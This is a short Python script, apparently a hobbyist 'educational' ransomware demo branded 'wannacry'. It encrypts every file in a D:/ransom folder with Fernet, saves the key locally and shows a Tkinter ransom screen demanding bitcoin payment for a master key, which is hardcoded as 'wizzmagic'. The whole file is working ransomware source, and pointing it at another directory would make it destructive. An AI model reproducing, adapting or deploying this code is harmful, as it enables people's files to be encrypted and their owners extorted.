#!/usr/bin/env python3
import tkinter.font
import os
from cryptography.fernet import Fernet
from tkinter import *
import colorama
from colorama import Fore
from termcolor import colored
from pyfiglet import Figlet
f=Figlet(font='standard')
print(colored(f.renderText('wannacry'),'blue'))
print(colored(f.renderText('ransomware'),'red'))
print(Fore.BLUE+'Github : https://github.com/WIZARD00007/')
print(Fore.RED +'caution :ONLY FOR EDUCATIONAL PURPOSE')
print(Fore.RED +'create/add files inside ransom directory in D drive (ex: D:/ransom)')
os.chdir('D:/ransom')
files=[]
for file in os.listdir():
   if file == 'encrypter.py' or file=='seretkey.key'  or file=='bkgrnd.png':
       continue
   if os.path.isfile(file):
       files.append(file)
key=Fernet.generate_key()
with open("seretkey.key","wb") as akey:
    akey.write(key)
for file in files:
    with open(file,"rb") as thefile:
        contents=thefile.read()
    contents_encry=Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encry)
def getkey():
    global entry1
    key_user=entry1.get()
    if key_user=='wizzmagic':
        with open("seretkey.key","rb") as key:
            seckey=key.read()
            for file in files:
                 with open(file,"rb") as thefile:
                    contents=thefile.read()
                 contents_decry=Fernet(seckey).decrypt(contents)
                 with open(file,"wb") as thefile:
                      thefile.write(contents_decry)
            print(Fore.GREEN+'SUCCESSFULLY DECRYPTED YOUR FILES')
    else:
        print(Fore.RED+'INVALID MASTER KEY')

window=Tk()
window.title('wannacry ransomware')
window.geometry("800x480+10+10")
bg=PhotoImage(file="bkgrnd.png")
label1=Label(window,image=bg)
label1.place(x=0,y=0)
myfont=tkinter.font.Font(family="Comic Sans MS",
                         size=20,
                         weight="bold")
lbl=Label(window,text="oops! what happend",fg='red',bg='black',font=(myfont,25))
lbl.place(x=250,y=30)
lbl3=Label(window,text="Your file has been encrypted. In order to decrypt your files you should  pay some bitcoins",fg='green',bg='black',font=('bold',15))
lbl3.place(x=0,y=80)
lbl4=Label(window,text="After payment you will receive a master key to decrypt your files",fg='green',bg='black',font=('bold',15))
lbl4.place(x=80,y=110)
lbl7=Label(window,text="Enter your master key",fg='red',bg='black',font=('bold',15))
lbl7.place(x=270,y=260)
entry1=Entry(window,fg='red',bg='black')
entry1.pack()
entry1.focus_set()
entry1.place(x=300,y=300)
but1=Button(text='submit',fg='red',bg='black',command=getkey)
but1.place(x=300,y=330)
window.mainloop()
